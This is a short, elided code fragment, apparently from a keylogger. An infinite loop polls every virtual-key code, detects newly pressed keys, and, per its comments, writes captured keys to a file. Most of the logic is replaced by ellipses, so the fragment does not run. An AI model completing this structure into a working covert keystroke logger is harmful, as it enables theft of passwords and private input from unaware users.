	...
	while(1) {
		...
		for(vkey=0;vkey<0xFF;vkey++) {
			...
			if (isPressed == 1 && last_key_state[vkey] == 0) {
				...
				//handle alphabetical virtual-keys
				...
				//if a key was captured, print it to the file
			...
			//save the key to the array of former keys
			last_key_state[vkey] = isPressed;
		}

	} //end of infinite loop
} //end of logg function